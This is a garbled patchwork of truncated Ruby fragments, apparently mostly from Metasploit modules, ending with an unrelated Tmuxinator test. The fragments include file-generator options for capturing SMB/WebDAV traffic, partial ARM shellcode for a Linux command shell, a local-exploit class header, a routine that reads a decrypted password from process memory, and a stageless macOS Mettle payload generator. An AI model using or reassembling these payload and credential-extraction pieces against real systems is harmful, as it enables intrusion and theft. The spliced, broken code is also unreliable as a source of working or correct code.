
        
              ))
    register_options(
      [
        OptAddress.new('LHOST', [ true, 'Host listening for incoming SMB/WebDAV traffic', nil]),
        OptString.new('FILENAME', [ true, 'Filename - supports *.lnk, *.scf, *.url, *.xml, desktop.ini', 'word.lnk']),
      ])
  end
    
        self.conn_threads = []
    self.listener_threads = []
    self.listener_pairs = {}
  end
    
      def initialize(info = {})
    super(merge_info(info,
      'Name'          => 'Linux Command Shell, Reverse TCP Inline',
      'Version'       => '',
      'Description'   => 'Connect to target and spawn a command shell',
      'Author'        => ['civ', 'hal'],
      'License'       => MSF_LICENSE,
      'Platform'      => 'linux',
      'Arch'          => ARCH_ARMLE,
      'Handler'       => Msf::Handler::BindTcp,
      'Session'       => Msf::Sessions::CommandShellUnix,
      'Payload'       =>
        {
          'Offsets' =>
            {
              'RHOST'    => [ 172, 'ADDR' ],
              'LPORT'    => [ 170, 'n' ],
            },
          'Payload' =>
            [
              # socket
              0xe3a00002, # mov     r0, #2
              0xe3a01001, # mov     r1, #1
              0xe3a02006, # mov     r2, #6
              0xe3a07001, # mov     r7, #1
              0xe1a07407, # lsl     r7, r7, #8
              0xe2877019, # add     r7, r7, #25
              0xef000000, # svc     0x00000000
              0xe1a06000, # mov     r6, r0
    }
    
      private
    
    lib = File.join(Msf::Config.install_root, 'test', 'lib')
$LOAD_PATH.push(lib) unless $LOAD_PATH.include?(lib)
require 'module_test'
    
    class MetasploitModule < Msf::Exploit::Local
  Rank = ExcellentRanking
    
          ])
    
        return '' if len == 0
    decrypted_pw = process.memory.read(addr, len)
    return decrypted_pw
  end
    
      #
  # Option parsing
  #
  opts.parse(args) do |opt, idx, val|
    case opt
    when '-h'
      print_line(opts.usage)
      raise Rex::Script::Completed
    when '-A'
      autoconn = true
    when '-r'
      remove = true
    end
  end
    
      end
    
    #
# Holds references to data services (@see Metasploit::Framework::DataService)
# and forwards data to the implementation set as current.
#
module Metasploit
module Framework
module DataService
class DataProxy
  include DataProxyAutoLoader
    
    TLV_TYPE_IP                 = TLV_META_TYPE_RAW     | 1430
TLV_TYPE_MAC_ADDRESS        = TLV_META_TYPE_RAW     | 1431
TLV_TYPE_MAC_NAME           = TLV_META_TYPE_STRING  | 1432
TLV_TYPE_NETWORK_INTERFACE  = TLV_META_TYPE_GROUP   | 1433
TLV_TYPE_IP6_SCOPE          = TLV_META_TYPE_RAW     | 1434
    
      def generate
    opts = {
      scheme: 'https',
      stageless: true
    }
    MetasploitPayloads::Mettle.new('x86_64-apple-darwin', generate_config(opts)).to_binary :exec
  end
end

    
    describe Tmuxinator::Pane do
  let(:klass) { described_class }
  let(:instance) { klass.new(index, project, window, *commands) }
  # let(:index) { 'vim' }
  # let(:project) { 0 }
  # let(:tab) { nil }
  # let(:commands) { nil }
  let(:index) { 0 }
  let(:project) { double }
  let(:window) { double }
  let(:commands) { ['vim', 'bash'] }
    
      if pane_base_index = options.fetch(:pane_base_index) { 1 }
    standard_options << 'pane-base-index #{pane_base_index}'
  end